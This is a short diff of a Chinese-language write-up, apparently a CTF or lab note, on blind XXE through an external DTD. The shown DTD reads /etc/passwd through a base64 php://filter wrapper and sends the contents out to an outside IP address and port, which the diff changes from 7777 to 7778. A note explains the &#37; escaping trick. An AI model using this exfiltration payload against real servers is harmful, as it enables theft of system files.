@@ -58,7 +58,7 @@ Connection: close
 首先在1.dtd写好嵌套php伪协议的file协议读取/passwd
 ```dtd
 <!ENTITY %file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
-<!ENTITY %guc "<!ENTITY &#37; send SYSTEM 'http://172.28.222.35:7777/?p=%file;'>">
+<!ENTITY %guc "<!ENTITY &#37; send SYSTEM 'http://172.28.222.35:7778/?p=%file;'>">
 ```
 ### 注意
 后面的&#37;实际上就是参数实体内不能在直接写% send，否则会被提前解析
